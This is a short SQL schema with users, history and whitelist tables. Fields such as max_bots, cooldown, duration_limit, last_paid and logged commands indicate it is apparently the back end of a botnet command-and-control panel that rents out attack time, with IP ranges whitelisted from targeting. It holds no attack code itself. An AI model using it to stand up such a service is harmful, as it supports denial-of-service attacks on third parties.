CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    api_key TEXT,
    max_bots INTEGER NOT NULL,
    admin INTEGER NOT NULL DEFAULT 0,
    last_paid DOUBLE PRECISION NOT NULL,
    cooldown INTEGER NOT NULL,
    duration_limit INTEGER,
    wrc INTEGER DEFAULT 0,
    intvl INTEGER DEFAULT 30
);

CREATE TABLE history (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    time_sent DOUBLE PRECISION NOT NULL,
    duration INTEGER NOT NULL,
    command TEXT NOT NULL,
    max_bots INTEGER NOT NULL
);

CREATE TABLE whitelist (
    id SERIAL PRIMARY KEY,
    prefix TEXT NOT NULL,      -- e.g., '192.168.1.0'
    netmask INTEGER NOT NULL   -- e.g., 24
);